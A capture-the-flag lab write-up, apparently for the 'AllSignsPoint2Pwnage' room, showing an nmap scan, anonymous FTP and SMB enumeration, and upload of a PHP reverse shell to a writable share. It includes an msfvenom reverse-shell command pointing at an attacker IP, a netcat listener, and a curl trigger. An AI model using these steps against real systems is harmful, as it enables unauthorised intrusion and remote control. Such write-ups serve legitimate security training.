# AllSignsPoint2Pwnage (WIP)

## Nmap

```
sudo nmap 10.10.54.102 -p- -sS -sV -Pn

Not shown: 65519 closed ports
PORT      STATE SERVICE       VERSION
21/tcp    open  ftp           Microsoft ftpd
80/tcp    open  http          Apache httpd 2.4.46 ((Win64) OpenSSL/1.1.1g PHP/7.4.11)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
443/tcp   open  ssl/http      Apache httpd 2.4.46 ((Win64) OpenSSL/1.1.1g PHP/7.4.11)
445/tcp   open  microsoft-ds?
3389/tcp  open  ms-wbt-server Microsoft Terminal Services
5040/tcp  open  unknown
5900/tcp  open  vnc           VNC (protocol 3.8)
49664/tcp open  msrpc         Microsoft Windows RPC
49665/tcp open  msrpc         Microsoft Windows RPC
49666/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49668/tcp open  msrpc         Microsoft Windows RPC
49672/tcp open  msrpc         Microsoft Windows RPC
49683/tcp open  msrpc         Microsoft Windows RPC
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
```

First up checking FTP shows we can login with anonymous login. From here listing the contents only shows notice.txt.

![](<../../.gitbook/assets/image (1322).png>)

Viewing the contents we become aware of a hidden SMB share called 'images'. The notice also implies uploading is possible on the share.

![](<../../.gitbook/assets/image (1323) (1).png>)

Checking for shares with smbclient.

```
smbclient -U '' -L \\\\10.10.54.102\\
```

![](<../../.gitbook/assets/image (1324).png>)

We can then connect to the images$ share. List the contents and confirmd file upload with the `put` command using test.txt

![](<../../.gitbook/assets/image (1325).png>)

Browsing to port 80 to check out the webserver we are presented with a slideshow. Using the contextual menu to save the images shows us the name of the image which matches that in the SMB share.

![](<../../.gitbook/assets/image (1326).png>)

We can test if we can read the contents of test.txt to confirm we can execute uploaded files. We can try the /images/ directory as we known the share exists.

```
curl http://10.10.54.102/images/test.txt 
```

![](<../../.gitbook/assets/image (1327).png>)

Knowing this works we can start to work towards getting a reverse shell. Checking information regarding the web server using Nikto shows it is powered by PHP.

![](<../../.gitbook/assets/image (1328).png>)

Ideally we should create a PHP reverse shell and upload it to the SMB share. We can achieve this with msfvenom as shown below.

```
msfvenom -p php/reverse_php LHOST=10.14.3.108 LPORT=80 -f raw > phpreverseshell.php
```

Then upload the shell to the SMB share.

![](<../../.gitbook/assets/image (1329).png>)

Open a `netcat` listener to the port specified in the payload.

```
sudo nc -lvp 80
```

Then execute the shell with curl.

```
curl http://10.10.54.102/images/phpreverseshell.php
```

Which connects our listener.

![](<../../.gitbook/assets/image (1330).png>)
